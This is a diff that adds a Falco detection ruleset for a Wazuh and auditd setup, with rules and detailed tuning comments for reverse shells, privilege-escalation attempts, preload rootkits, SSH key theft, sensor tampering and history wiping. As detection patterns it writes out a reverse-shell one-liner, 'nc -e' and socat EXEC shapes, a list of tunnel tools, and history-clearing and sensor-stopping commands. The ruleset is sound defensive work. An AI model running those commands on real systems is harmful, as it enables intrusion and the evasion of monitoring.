@@ -1,0 +1,551 @@
+################################################################################
+# FALCO RULESET -- wazuh-auditd-installer: managed ruleset
+#
+# Deployed as /etc/falco/rules.d/wazuh-falco-rules.yaml
+#
+# Falco's shipped falco.yaml already lists /etc/falco/rules.d in rules_files,
+# so dropping this file in is enough -- no config change is needed to load it.
+# It is loaded AFTER /etc/falco/falco_rules.yaml, so an override: here would
+# replace an upstream rule of the same name. Nothing here does that: every rule
+# is prefixed "Wazuh:" so it can never collide with an upstream name.
+#
+# These rules own the DETECTION half of the sensor split. auditd owns the audit
+# trail, authentication/account events and the compliance file watches; see
+# auditd/rules/audit.rules and docs/falco-auditd-wazuh.md.
+#
+# Rule names are a stable API: wazuh/rules/225000-det-falco-generic.xml matches
+# on them with an anchored regex. Renaming a rule here breaks its Wazuh rule.
+#
+# Self-contained on purpose. Every list and macro is prefixed wz_ and defined
+# below rather than reusing upstream's (shell_binaries, spawned_process, ...),
+# so this file keeps working if falco_rules.yaml is ever disabled or upstream
+# renames one of its macros.
+#
+# Deliberately NO container.* or k8s.* conditions. Those fields are empty on a
+# bare host, and a condition referencing them silently never matches -- which is
+# why several upstream rules do nothing outside Kubernetes.
+#
+# CONVENTION: detections match on proc.name, exclusions match on proc.exepath.
+# proc.name is comm, which the process controls: a payload copied to ./sshd
+# reports proc.name=sshd. For a detection that is an accepted limitation shared
+# by every name-based rule, and the consequence is a missed detection. For an
+# EXCLUSION the consequence is an attacker turning a rule off by choosing a
+# filename, so every exclusion list here holds resolved executable paths. Keep
+# it that way when adding entries: take the path from proc.exepath in a real
+# event rather than writing the name you expect.
+#
+# Validate before restarting Falco:
+#   falco --validate /etc/falco/rules.d/wazuh-falco-rules.yaml
+################################################################################
+
+- required_engine_version: 0.31.0
+
+# ==============================================================================
+# LISTS
+# ==============================================================================
+
+- list: wz_shell_binaries
+  items: [ash, bash, csh, dash, fish, ksh, sh, tcsh, zsh, busybox]
+
+# NOTE: a "shell spawned by a network service" rule used to live here, with its
+# own list of service binaries. It was removed rather than fixed: upstream's
+# "Run shell untrusted" covers the same shape, loads first and therefore wins
+# anyway, and carries a maintained spawner list plus exceptions for nginx
+# restarting itself, package managers, cron and Consul that a hand-written list
+# does not. It is mapped by Wazuh rule 225141 instead. The lesson generalises:
+# before adding a rule here, check whether upstream already fires for the event.
+
+# Classic post-compromise enumeration. Kept narrow on purpose.
+#
+# ip, ss and netstat are left to auditd's network_tools key, because daemons
+# and DHCP hooks run them constantly.
+#
+# uname, hostname and lsb_release were removed after measuring: on Ubuntu the
+# MOTD scripts run them on every SSH login, and a single login produced 10
+# recon events (uname six times from /etc/update-motd.d/00-header alone). That
+# is exactly the threshold of the Wazuh burst rule 225300, so every login
+# raised a level 10 alert. They are also the weakest signal in the set, since
+# practically every shell script calls them. What is left is the enumeration
+# that says something about intent.
+- list: wz_recon_binaries
+  items: [whoami, id, uptime, w, who, last, lastlog, groups]
+
+- list: wz_data_transfer_binaries
+  items: [curl, wget, scp, sftp, rsync, ftp, tftp, base64]
+
+# Rarely legitimate on a server, and the standard reverse-shell toolkit.
+- list: wz_tunnel_binaries
+  items: [nc, ncat, netcat, "nc.openbsd", "nc.traditional", socat, chisel, ngrok]
+
+# Daemons whose normal job is to attach a network socket to a session's stdio.
+# Without these, the stdio-redirect rule fires on every SSH login.
+#
+# These are EXECUTABLE PATHS, not process names, and that is deliberate. An
+# exclusion keyed on proc.name (which is comm) can be defeated by naming your
+# own binary after an allowlisted process: a payload copied to ./sshd would
+# have been excluded from the reverse-shell rule. Overwriting /usr/sbin/sshd
+# requires root, which is a far higher bar, and is itself caught by the
+# sensor-tampering rules.
+#
+# Kept to the daemons for which attaching a socket to stdio is the documented
+# mechanism of a remote login. Generic clients (ssh, rsync, su, sudo, tmux,
+# screen) were removed: none was observed producing this event, and each one
+# left in widens the bypass surface for nothing. If one does turn up in your
+# environment, add its resolved path from proc.exepath, not its name.
+- list: wz_session_daemon_paths
+  items: [
+    /usr/sbin/sshd, /usr/sbin/sshd-session, /usr/sbin/sshd-auth,
+    /usr/lib/openssh/sshd-session, /usr/libexec/openssh/sshd-session,
+    /usr/sbin/dropbear, /usr/sbin/in.telnetd, /usr/sbin/telnetd,
+    /usr/bin/mosh-server, /usr/sbin/xrdp, /usr/sbin/xrdp-sesman,
+    /usr/lib/systemd/systemd, /usr/bin/systemd, /sbin/init
+  ]
+
+# World-writable staging directories. A binary executing from here is almost
+# always a dropped payload.
+# Processes that legitimately load eBPF programs. Sandboxing and container
+# runtimes do this routinely: snap-confine loads a seccomp program on every
+# snap launch, and systemd does so for cgroup and socket filters.
+#
+# Executable paths rather than process names, for the same reason as
+# wz_session_daemon_paths above: this rule is the one that detects an eBPF
+# rootkit, and an attacker who only has to name their loader "snap-confine" to
+# be ignored defeats it entirely.
+#
+# Paths are listed for both usr-merged and RHEL-style layouts. A missing path
+# costs nothing; an entry that does not exist on this host simply never matches.
+# Add your own sandboxing and observability agents here by resolved path, which
+# you can read from proc.exepath in the event this rule produces.
+- list: wz_known_bpf_loader_paths
+  items: [
+    /usr/bin/falco, /usr/bin/falcoctl,
+    /usr/lib/systemd/systemd, /usr/bin/systemd, /sbin/init,
+    /usr/lib/systemd/systemd-journald, /usr/lib/systemd/systemd-udevd,
+    /usr/lib/systemd/systemd-networkd, /usr/lib/systemd/systemd-resolved,
+    /usr/lib/systemd/systemd-logind, /usr/lib/systemd/systemd-oomd,
+    /usr/lib/snapd/snap-confine, /usr/lib/snapd/snapd,
+    /usr/lib/snapd/snap-seccomp, /usr/lib/snapd/snap-update-ns,
+    /usr/bin/snap, /usr/sbin/NetworkManager,
+    /usr/bin/dockerd, /usr/bin/containerd, /usr/bin/containerd-shim,
+    /usr/bin/containerd-shim-runc-v2, /usr/sbin/runc, /usr/bin/runc,
+    /usr/bin/crio, /usr/bin/podman, /usr/bin/conmon,
+    /usr/sbin/tailscaled, /usr/bin/tailscaled, /usr/bin/cilium-agent,
+    /usr/bin/lxcfs, /usr/sbin/lxcfs
+  ]
+
+# The tools whose job is to read SSH key material. Paths, not names: a payload
+# named "ssh" must not be able to read /root/.ssh and be ignored.
+- list: wz_ssh_tool_paths
+  items: [
+    /usr/bin/ssh, /usr/sbin/sshd, /usr/sbin/sshd-session,
+    /usr/lib/openssh/sshd-session, /usr/libexec/openssh/sshd-session,
+    /usr/bin/scp, /usr/bin/sftp, /usr/lib/openssh/sftp-server,
+    /usr/libexec/openssh/sftp-server, /usr/bin/ssh-keygen,
+    /usr/bin/ssh-agent, /usr/bin/ssh-add, /usr/bin/ssh-copy-id,
+    /usr/lib/systemd/systemd, /usr/bin/systemd
+  ]
+
+# Bare basenames, matched against fd.filename. Do NOT switch this to
+# "fd.name pmatch": pmatch is a path-PREFIX match for directory containment,
+# so a list of "/.bash_history" entries matches nothing under /root or /home.
+# An earlier version used "fd.name endswith _history", which matched any file
+# anywhere whose name happened to end that way.
+- list: wz_history_files
+  items: [
+    ".bash_history", ".sh_history", ".ash_history", ".zsh_history", ".zhistory",
+    ".histfile", ".python_history", ".mysql_history", ".psql_history",
+    ".rediscli_history", ".node_repl_history"
+  ]
+
+- list: wz_payload_dirs
+  items: [/tmp/, /var/tmp/, /dev/shm/, /run/shm/, /var/spool/samba/]
+
+# ==============================================================================
+# MACROS
+# ==============================================================================
+
+- macro: wz_spawned_process
+  condition: (evt.type in (execve, execveat))
+
+- macro: wz_open_write
+  condition: (evt.type in (open, openat, openat2) and evt.is_open_write=true and fd.typechar='f' and fd.num>=0)
+
+- macro: wz_open_read
+  condition: (evt.type in (open, openat, openat2) and evt.is_open_read=true and fd.typechar='f' and fd.num>=0)
+
+# Any path by which a file is replaced or destroyed, not just opened for write.
+# This is the gap an auditd "-w <path> -p w" watch covers and open_write does
+# not: a file swapped with mv, or deleted and recreated.
+- macro: wz_file_replaced
+  condition: (evt.type in (rename, renameat, renameat2, unlink, unlinkat, truncate, ftruncate))
+
+- macro: wz_interactive
+  condition: (proc.tty != 0)
+
+- macro: wz_outbound_connect
+  condition: (evt.type = connect and evt.res = SUCCESS and fd.type in (ipv4, ipv6))
+
+# Loopback is not an exfiltration path and is extremely common (local proxies,
+# database clients, health checks).
+- macro: wz_not_loopback
+  condition: (fd.sip != "127.0.0.1" and fd.sip != "::1")
+
+# The Wazuh agent's own processes trip the high-volume NOTICE rules on every FIM
+# and SCA cycle. Filtering here, at the sensor, rather than in Wazuh keeps the
+# events out of analysisd and the indexer entirely.
+#
+# Ancestry is matched by exepath, not by name: proc.aname[2] in (wazuh-modulesd)
+# would let anything started from a process that merely called itself
+# wazuh-modulesd drop out of the command trail.
+- macro: wz_wazuh_agent_proc
+  condition: (proc.exepath startswith /var/ossec/bin/
+              or proc.aexepath[2] startswith /var/ossec/bin/
+              or proc.aexepath[3] startswith /var/ossec/bin/)
+
+# Placeholder for site-specific tuning. Redefine this macro in a file that
+# sorts AFTER this one in /etc/falco/rules.d/ to whitelist your own noise
+# without editing this file -- e.g. /etc/falco/rules.d/zz-local-tuning.yaml:
+#   - macro: wz_user_known_activity
+#     condition: (proc.exepath = /opt/backup/bin/agent)
+- macro: wz_user_known_activity
+  condition: (evt.num = 0)
+
+# ==============================================================================
+# CRITICAL -- active compromise shapes
+# ==============================================================================
+
+# bash -i >& /dev/tcp/<ip>/<port> 0>&1 makes the shell itself call connect().
+# A legitimate interactive shell essentially never does.
+- rule: "Wazuh: Reverse shell connection from shell binary"
+  desc: >
+    A shell binary opened an outbound network connection itself. This is the
+    /dev/tcp reverse-shell shape; shells do not normally call connect(). The
+    auditd remote_shell key records the same syscall for the audit trail, but
+    without the destination address that is on this event.
+  condition: >
+    wz_outbound_connect
+    and proc.name in (wz_shell_binaries)
+    and wz_not_loopback
+    and not wz_user_known_activity
+  output: >
+    Reverse shell connection from shell binary
+    (shell=%proc.name dest=%fd.sip:%fd.sport cmd=%proc.cmdline parent=%proc.pname
+     user=%user.name loginuser=%user.loginname tty=%proc.tty exe=%proc.exepath)
+  priority: CRITICAL
+  tags: [host, network, mitre_execution, T1059, T1071]
+
+# nc -e /bin/bash and socat EXEC: dup a socket onto the shell's stdio. The
+# upstream rule for this is scoped to "and container", so it never fires on a
+# plain host -- this is the host-shaped version.
+- rule: "Wazuh: Standard stream redirected to network connection"
+  desc: >
+    A process redirected stdin, stdout or stderr onto a network socket via dup.
+    This is the other half of the reverse-shell family, covering nc -e and
+    socat EXEC where the shell itself never calls connect().
+
+    sshd and the other session daemons are excluded because attaching the
+    client socket to the session's stdio is exactly how a remote login works:
+    without the exclusion this rule fires four CRITICAL events on every single
+    SSH login (verified on 0.45.2).
+  condition: >
+    evt.type in (dup, dup2, dup3)
+    and fd.num in (0, 1, 2)
+    and fd.type in (ipv4, ipv6)
+    and not proc.exepath in (wz_session_daemon_paths)
+    and not wz_user_known_activity
+  output: >
+    Standard stream redirected to network connection
+    (fd=%fd.num dest=%fd.sip:%fd.sport proc=%proc.name cmd=%proc.cmdline
+     parent=%proc.pname user=%user.name exe=%proc.exepath)
+  priority: CRITICAL
+  tags: [host, network, mitre_execution, T1059]
+
+- rule: "Wazuh: Process launched from world-writable directory"
+  desc: >
+    A binary executed from /tmp, /var/tmp or /dev/shm. Legitimate software is
+    not installed in these directories; this is where dropped payloads run from.
+  condition: >
+    wz_spawned_process
+    and (proc.exepath pmatch (wz_payload_dirs))
+    and not wz_user_known_activity
+  output: >
+    Process launched from world-writable directory
+    (exe=%proc.exepath cmd=%proc.cmdline parent=%proc.pname user=%user.name
+     loginuser=%user.loginname tty=%proc.tty)
+  priority: CRITICAL
+  tags: [host, process, mitre_execution, T1059, T1036]
+
+- rule: "Wazuh: Polkit privilege escalation attempt"
+  desc: >
+    pkexec or dbus-send executed from a real login session. pkexec with no
+    arguments is the PwnKit shape (CVE-2021-4034); dbus-send against the polkit
+    interface is the CVE-2021-3560 bypass. auditd records the execution under
+    priv_esc; this event adds the parent and the real caller.
+
+    Matched on user.loginuid, not user.uid. pkexec is setuid root, so by the
+    time the execve event is emitted user.uid is already 0 and a uid filter
+    never matches (verified: a pkexec run by an unprivileged user reports
+    user=root). user.loginuid is the audit loginuid, the same value auditd
+    filters on as auid, and it still names the human who started the session.
+    loginuid -1 means no login session, which excludes services.
+  condition: >
+    wz_spawned_process
+    and proc.name in (pkexec, dbus-send)
+    and user.loginuid != 0
+    and user.loginuid != -1
+    and not wz_user_known_activity
+  output: >
+    Polkit privilege escalation attempt
+    (proc=%proc.name cmd=%proc.cmdline user=%user.name uid=%user.uid
+     loginuser=%user.loginname parent=%proc.pname args=%proc.args)
+  priority: CRITICAL
+  tags: [host, privilege_escalation, mitre_privilege_escalation, T1068, T1548]
+
+# ld.so.preload injects a shared object into every process started afterwards.
+# wz_file_replaced is included because the usual method is to write a new file
+# and mv it into place, which open_write alone does not see.
+- rule: "Wazuh: Library preload file modified"
+  desc: >
+    /etc/ld.so.preload or an ld.so.conf path was written, replaced or removed.
+    Any object listed there is loaded into every subsequently started process,
+    making this one of the most direct rootkit persistence paths.
+  condition: >
+    (wz_open_write or wz_file_replaced)
+    and (fd.name startswith /etc/ld.so or evt.arg.path startswith /etc/ld.so or evt.arg.name startswith /etc/ld.so)
+    and not wz_user_known_activity
+  output: >
+    Library preload file modified
+    (file=%fd.name path=%evt.arg.path proc=%proc.name cmd=%proc.cmdline
+     parent=%proc.pname user=%user.name exe=%proc.exepath)
+  priority: CRITICAL
+  tags: [host, filesystem, mitre_persistence, T1574.006]
+
+# The mutual-watch half of the split: Falco watches auditd's configuration,
+# auditd watches Falco's (keys falco_config / falco_exec / falco_logs).
+- rule: "Wazuh: Security sensor configuration modified"
+  desc: >
+    A configuration or ruleset file belonging to Falco, auditd, LAUREL or the
+    Wazuh agent was written or replaced. Narrowing a sensor's own rules is how
+    an attacker goes quiet without stopping any service.
+  condition: >
+    (wz_open_write or wz_file_replaced)
+    and (fd.name startswith /etc/falco/
+         or fd.name startswith /etc/audit/
+         or fd.name startswith /etc/laurel/
+         or fd.name startswith /var/ossec/etc/
+         or evt.arg.path startswith /etc/falco/
+         or evt.arg.path startswith /etc/audit/
+         or evt.arg.path startswith /etc/laurel/
+         or evt.arg.path startswith /var/ossec/etc/)
+    and not proc.exepath startswith /var/ossec/bin/
+    and not proc.exepath in (/usr/sbin/augenrules, /sbin/augenrules,
+                             /usr/sbin/auditctl, /sbin/auditctl,
+                             /usr/bin/falcoctl)
+    and not wz_user_known_activity
+  output: >
+    Security sensor configuration modified
+    (file=%fd.name path=%evt.arg.path proc=%proc.name cmd=%proc.cmdline
+     parent=%proc.pname user=%user.name loginuser=%user.loginname exe=%proc.exepath)
+  priority: CRITICAL
+  tags: [host, filesystem, mitre_defense_evasion, T1562.001]
+
+- rule: "Wazuh: Security sensor service stopped"
+  desc: >
+    A command was run to stop, disable, mask or kill Falco, auditd, LAUREL or
+    the Wazuh agent. Silencing the sensor is normally the first step before
+    anything else an attacker intends to do.
+  condition: >
+    wz_spawned_process
+    and (
+      (proc.name in (systemctl, service, initctl, rc-service)
+       and (proc.cmdline contains stop or proc.cmdline contains disable
+            or proc.cmdline contains mask or proc.cmdline contains kill)
+       and (proc.cmdline contains falco or proc.cmdline contains auditd
+            or proc.cmdline contains wazuh or proc.cmdline contains laurel))
+      or
+      (proc.name in (kill, pkill, killall)
+       and (proc.cmdline contains falco or proc.cmdline contains auditd
+            or proc.cmdline contains wazuh or proc.cmdline contains laurel))
+      or
+      (proc.name = auditctl and proc.cmdline contains "-D")
+    )
+    and not wz_user_known_activity
+  output: >
+    Security sensor service stopped or disabled
+    (cmd=%proc.cmdline proc=%proc.name parent=%proc.pname user=%user.name
+     loginuser=%user.loginname tty=%proc.tty exe=%proc.exepath)
+  priority: CRITICAL
+  tags: [host, process, mitre_defense_evasion, T1562.001, T1489]
+
+# ==============================================================================
+# WARNING -- strong indicators needing context
+# ==============================================================================
+
+- rule: "Wazuh: SSH private key read by unexpected process"
+  desc: >
+    An SSH private key or host key was read by something other than ssh, sshd or
+    a key-management tool. Stolen keys are the usual lateral-movement path.
+  condition: >
+    wz_open_read
+    and (fd.name startswith /root/.ssh/
+         or fd.name startswith /etc/ssh/ssh_host_
+         or (fd.name glob "/home/*/.ssh/id_*" and not fd.name endswith .pub))
+    and not proc.exepath in (wz_ssh_tool_paths)
+    and not proc.exepath startswith /var/ossec/bin/
+    and not wz_user_known_activity
+  output: >
+    SSH private key read by unexpected process
+    (file=%fd.name proc=%proc.name cmd=%proc.cmdline parent=%proc.pname
+     user=%user.name loginuser=%user.loginname exe=%proc.exepath)
+  priority: WARNING
+  tags: [host, filesystem, mitre_credential_access, T1552.004]
+
+- rule: "Wazuh: Setuid or setgid bit set on file"
+  desc: >
+    A chmod set the setuid or setgid bit. Marking a shell or interpreter setuid
+    root is a persistent, trivially reusable backdoor. auditd records every
+    chmod under perm_mod; this fires only on the bits that grant privilege.
+  condition: >
+    evt.type in (chmod, fchmod, fchmodat)
+    and evt.rawres >= 0
+    and (evt.arg.mode contains S_ISUID or evt.arg.mode contains S_ISGID)
+    and not proc.exepath startswith /var/ossec/bin/
+    and not wz_user_known_activity
+  output: >
+    Setuid or setgid bit set on file
+    (file=%fd.name mode=%evt.arg.mode proc=%proc.name cmd=%proc.cmdline
+     parent=%proc.pname user=%user.name loginuser=%user.loginname)
+  priority: WARNING
+  tags: [host, filesystem, mitre_persistence, T1548.001]
+
+# Complements the auditd bpf_load key. Together they cover the case of an
+# attacker using eBPF itself -- including to hide from Falco.
+- rule: "Wazuh: eBPF program loaded"
+  desc: >
+    A process called bpf() to load or manipulate an eBPF program. Expected from
+    Falco and systemd at startup; from anything else it may be an eBPF rootkit
+    or an attempt to tamper with the sensor's own probes.
+
+    The exclusion list is the tuning point for this rule, and it is not
+    optional: on an Ubuntu host with snaps installed, snap-confine loads a
+    seccomp/bpf program for every snap launch and produced 264 of 306 events
+    in a test soak. Add your own sandboxing and observability agents to
+    wz_known_bpf_loader_paths rather than lowering the priority.
+  condition: >
+    evt.type = bpf
+    and evt.rawres >= 0
+    and not proc.exepath in (wz_known_bpf_loader_paths)
+    and not wz_user_known_activity
+  output: >
+    eBPF program loaded
+    (proc=%proc.name cmd=%proc.cmdline parent=%proc.pname user=%user.name
+     loginuser=%user.loginname exe=%proc.exepath)
+  priority: WARNING
+  tags: [host, process, mitre_defense_evasion, T1562, T1014]
+
+- rule: "Wazuh: Shell history tampered"
+  desc: >
+    A shell history file was truncated, deleted or redirected, or history was
+    cleared in-session. Anti-forensic cleanup after interactive access.
+  condition: >
+    (
+      (wz_file_replaced or wz_open_write)
+      and fd.filename in (wz_history_files)
+    )
+    or (
+      wz_spawned_process
+      and (proc.cmdline contains "history -c"
+           or proc.cmdline contains "HISTFILE=/dev/null"
+           or proc.cmdline contains "unset HISTFILE")
+    )
+  output: >
+    Shell history tampered
+    (file=%fd.name path=%evt.arg.path proc=%proc.name cmd=%proc.cmdline
+     parent=%proc.pname user=%user.name loginuser=%user.loginname tty=%proc.tty)
+  priority: WARNING
+  tags: [host, filesystem, mitre_defense_evasion, T1070.003]
+
+- rule: "Wazuh: Tunnel or bind shell tool executed"
+  desc: >
+    netcat, socat or a tunnelling client was executed. These have almost no
+    legitimate use on a production server and are the standard tooling for bind
+    shells, port forwarding and egress tunnels.
+  condition: >
+    wz_spawned_process
+    and proc.name in (wz_tunnel_binaries)
+    and not wz_user_known_activity
+  output: >
+    Tunnel or bind shell tool executed
+    (proc=%proc.name cmd=%proc.cmdline parent=%proc.pname user=%user.name
+     loginuser=%user.loginname tty=%proc.tty cwd=%proc.cwd)
+  priority: WARNING
+  tags: [host, process, mitre_command_and_control, T1059, T1572]
+
+# ==============================================================================
+# NOTICE -- volume drivers, correlated in Wazuh rather than alerted on
+#
+# These three rules replace auditd's broad execve collection. Individually they
+# are level 3 in Wazuh (forensic trail); it is the frequency rules 225300-225302
+# that alert. Falco has no frequency operator, so bursts stay Wazuh's job.
+#
+# ORDER IS LOAD-BEARING. Falco's rule_matching is "first": an event fires only
+# the first rule that matches it, in file order. "Interactive command executed
+# on terminal" matches any command with a tty, so it is defined LAST -- ahead of
+# the specific rules it would otherwise swallow, which would silently break the
+# recon and data-transfer burst rules in Wazuh. Same principle as the catch-all
+# ordering in wazuh/rules/225000-det-falco-generic.xml: specific first,
+# general last. Add new specific rules ABOVE the interactive rule.
+# ==============================================================================
+
+- rule: "Wazuh: Reconnaissance tool executed"
+  desc: >
+    A host enumeration tool was executed. One of these is unremarkable; a burst
+    of them in sequence is what post-compromise orientation looks like, which is
+    what Wazuh rule 225300 counts.
+  condition: >
+    wz_spawned_process
+    and proc.name in (wz_recon_binaries)
+    and not wz_wazuh_agent_proc
+    and not wz_user_known_activity
+  output: >
+    Reconnaissance tool executed
+    (proc=%proc.name cmd=%proc.cmdline parent=%proc.pname user=%user.name
+     loginuser=%user.loginname tty=%proc.tty)
+  priority: NOTICE
+  tags: [host, process, mitre_discovery, T1082, T1033]
+
+- rule: "Wazuh: Data transfer tool executed"
+  desc: >
+    A file transfer or encoding tool was executed. Individually routine; several
+    in a short window alongside archiving is the staging-and-exfiltration shape
+    that Wazuh rule 225301 counts.
+  condition: >
+    wz_spawned_process
+    and proc.name in (wz_data_transfer_binaries)
+    and not wz_wazuh_agent_proc
+    and not wz_user_known_activity
+  output: >
+    Data transfer tool executed
+    (proc=%proc.name cmd=%proc.cmdline parent=%proc.pname user=%user.name
+     loginuser=%user.loginname tty=%proc.tty cwd=%proc.cwd)
+  priority: NOTICE
+  tags: [host, process, mitre_exfiltration, T1048, T1105]
+
+- rule: "Wazuh: Interactive command executed on terminal"
+  desc: >
+    A command was executed with a controlling terminal attached. This is the
+    replacement for auditd's broad execve rule: it gives the same interactive
+    command trail with the parent process and full command line on one event,
+    and without shadowing auditd's per-tool watch keys.
+  condition: >
+    wz_spawned_process
+    and wz_interactive
+    and not wz_wazuh_agent_proc
+    and not wz_user_known_activity
+  output: >
+    Interactive command executed on terminal
+    (cmd=%proc.cmdline exe=%proc.exepath parent=%proc.pname user=%user.name
+     loginuser=%user.loginname uid=%user.uid tty=%proc.tty cwd=%proc.cwd
+     ancestors=%proc.aname[2],%proc.aname[3])
+  priority: NOTICE
+  tags: [host, process, mitre_execution, T1059]
